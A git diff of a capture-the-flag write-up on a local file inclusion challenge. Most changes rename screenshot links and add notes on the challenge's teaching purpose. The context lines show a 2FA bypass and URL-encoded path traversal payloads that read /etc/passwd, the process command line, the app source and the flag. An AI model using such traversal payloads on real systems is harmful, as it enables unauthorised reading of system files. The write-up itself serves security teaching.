@@ -34,13 +34,13 @@ Disallow: /2FA
 ```
 
 - Now let's login with these, we'll be shown a 2FA page. However, if you remember in ```/robots.txt``` there was a ```/admin/dashboard```, so if we hit that endpoint directly in our browser it bypasses 2FA.
-![alt text](<./Writeup-Images/Screenshot 2025-08-04 at 12.36.19 AM.png>)
-![alt text](<./Writeup-Images/Screenshot 2025-08-04 at 12.20.58 AM.png>)
+![alt text](./Writeup-Images/Screenshot_2025-08-04_at_12.36.19_AM.png)
+![alt text](./Writeup-Images/Screenshot_2025-08-04_at_12.20.58_AM.png)
 
 - Now we need to go to ```Manage Files```
 
 
-![alt text](<./Writeup-Images/Screenshot 2025-08-04 at 12.31.36 AM.png>)
+![alt text](./Writeup-Images/Screenshot_2025-08-04_at_12.31.36_AM.png)
 - When loading one of the files you'll see a GET request to ```/admin/download/secret1.txt```
 - if we try ```URLEncoded LFI``` we get this error message
     - URL: ```/admin/download/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64```
@@ -51,14 +51,14 @@ Disallow: /2FA
     - URL: ```%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%65%74%63%2f%70%61%73%73%77%64```
 
 - This will work and we will get the contents of ```/etc/passwd```
-![alt text](<./Writeup-Images/Screenshot 2025-08-04 at 12.32.08 AM.png>)
+![alt text](./Writeup-Images/Screenshot_2025-08-04_at_12.32.08_AM.png)
 
 - The solution to this is to figure out where we are and where the flag is, ```/proc/self/environ``` gives us nothing useful, so we need to try and find the source code to understand where the flag could be.
 
 - if we do ```/proc/self/cmdline``` it shows us the command that was used to run the current process we have LFI in.
     - ```python3 app.py```
 
-![alt text](<./Writeup-Images/Screenshot 2025-08-04 at 12.32.33 AM.png>)
+![alt text](./Writeup-Images/Screenshot_2025-08-04_at_12.32.33_AM.png)
 
 
 - now we don't know the absolute path, attempts like ```/app.py``` or ```./app.py``` (current directory) 
@@ -66,7 +66,7 @@ Disallow: /2FA
     - unintended (using relative traversals): ```/admin/download/%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%61%70%70%2e%70%79```
     - intended (using /proc/self/cwd/app.py): ```%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%70%72%6f%63%2f%73%65%6c%66%2f%63%77%64%2f%61%70%70%2e%70%79```
 
-![alt text](<./Writeup-Images/Screenshot 2025-08-04 at 12.32.53 AM.png>)
+![alt text](./Writeup-Images/Screenshot_2025-08-04_at_12.32.53_AM.png)
 
 - As you can see there is the following code snippet:
 ```python
@@ -87,4 +87,9 @@ URLEncoded:
 GET /admin/download/%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%70%72%6f%63%2f%73%65%6c%66%2f%63%77%64%2f%46%4c%41%47%2f%66%6c%61%67%2e%74%78%74
 ```
 
-![alt text](<./Writeup-Images/Screenshot 2025-08-04 at 12.35.22 AM.png>)
+![alt text](./Writeup-Images/Screenshot_2025-08-04_at_12.35.22_AM.png)
+
+## Additional notes
+
+- This can be a global instance, the goal of this is to help people learn about LFI.
+- The log directories are symlinked to `/dev/null` so people cannot cheese this by reading what other people did.
